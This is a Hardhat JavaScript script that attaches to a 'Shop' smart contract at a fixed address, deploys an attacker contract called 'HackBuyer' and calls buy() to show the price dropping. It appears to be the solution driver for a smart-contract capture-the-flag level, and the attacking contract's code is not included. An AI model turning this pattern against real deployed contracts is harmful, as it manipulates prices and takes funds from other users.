const hre = require("hardhat");
const { ethers } = hre;

async function main() {
  const shopAddr = "0xBF522CFE6deD1D8220BB87eF4aD650c9aC6C9433";

  const Shop = await ethers.getContractFactory("Shop");
  const shop = await Shop.attach(shopAddr);

  const HackBuyer = await ethers.getContractFactory("HackBuyer");
  const hackBuyer = await HackBuyer.deploy(shop.address);

  console.log("Price before:", (await shop.price()).toString());
  await hackBuyer.buy();
  console.log("Price after:", (await shop.price()).toString());
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
